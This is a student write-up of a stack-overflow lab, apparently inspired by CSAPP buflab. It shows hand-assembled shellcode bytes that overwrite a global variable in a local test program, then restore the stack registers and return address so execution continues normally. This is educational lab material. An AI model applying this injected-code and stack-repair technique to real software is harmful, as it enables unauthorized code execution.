# StackOverflow Final

## Goals
1. Target global variable
2. First Attack
3. Figure out how to return normally
4. Final Attack


## Locate `a`
In our `test.c` used in Level 3, there is a global variable `a` initialized to `0`. We need to change it to `1` to complete the hacking challenge.

First, we need to know `a`'s address. Simply disassemble the program so we know it:

    400605: 8b 05 49 0a 20 00       mov    0x200a49(%rip),%eax        # 601054 <a>

Second, we need to know how to assemble the string to complete the operation `a=1`:

    48 c7 c0 01 00 00 00      # mov    $0x1, %rax
    48 89 04 25 54 10 60 00   # mov    %rax, 0x601054

Here, We set `%rax` to `1`, then we move `%rax`'s value into `a`'s address.

NOTE: How did I get the hexadecimal? I used `as` to assemble the segment of x86 assembling code I handwrite, then disassemble it to check if it is legal, and grab the hexadecimal code by the way.

## First Attack
We concatenate the assembled hexadecimal code to the head of the string. In order to test whether `a` has been changed, we need to turn on the `gdb` and `run < hex_str`. After we got `illegal instruction`. We will `x 0x601054`, and find out if it is `0x000000001`, like:

    Program received signal SIGILL, Illegal instruction.
    0x00007fffffffe29f in ?? ()
    (gdb) x 0x601054
    0x601054 <a>:   0x00000001

## How to return as if nothing as happened?
We want to return to `test()` normally after we modified `a`'s value. So the original `if` will be fooled!

Dear reader, if you got a minute, please try to work out how to code this first.

My scheme is simple. Since the first time we returned, we returned to the address in stack, which is the forged one. So the second time, we need to restore two parts: Registers and memory, and use our own `leave` and `ret` instructions to return.

First, modify the stack pointers, i.e. `$rbp` and `$rsp` exactly as what they are before the first `leave` is done.

Second, since the stack is also corrupted by our string, so we need to recover it, i.e. the return address and pushed `$rbp`'s value. We can know them easily in `gdb` as well.

So, the assembling code would come naturally:

    48 c7 c0 01 00 00 00    mov    $0x1,%rax
    48 89 04 25 54 10 60    mov    %rax,0x601054
    00 
    48 bc b0 e2 ff ff ff    movabs $0x7fffffffe2b0,%rsp
    7f 00 00 
    48 bd 80 ea ff ff ff    movabs $0x7fffffffea80,%rbp
    7f 00 00 
    48 c7 45 08 05 06 40    movq   $0x400605,0x8(%rbp)
    00 
    48 c7 45 0c 00 00 00    movq   $0x0,0xc(%rbp)
    00 
    c9                      leaveq 
    c3                      retq 

I have put the attacking part in `attack_string.txt`, and the tail string which will corrupt the stack in `cover_string.txt`.

While you may use `perl` to pad the 2000 bytes long string, you can assembly them into a string with `gen.py` automatically as well. You can set the `NOP`s at the head in the python script, and `python gen.py > string` to generate the string.

## Final Attack
Finally, we construct the string and feed it into `./test`.

Oops, the fact is, on my machine, `illegal instruction` fault came out. But to my surprise, in `GDB`, it is a success!

So, I try to use `gen.py` to pad a bunch of `NOP`s before the actual attacking code, hoping it would help. But it failed. However, since we succeeded in debugger, there is no way to debug it (X_X). If you met the same problem and figure it out, please tell me!

Oh, I almost forget, turn you Linux's protection back on after the hacking session!

## Some more words
### Reference
CMU's CSAPP buflab inspired me greatly. So, you may want to checkout it yourself.

### About Shellcode
Actually, if you searched for "stack smashing attack" on the web, `shellcode` will be a hot keyword. It is just like our final level, but its target is to spawn a shell, which gave out the privilege.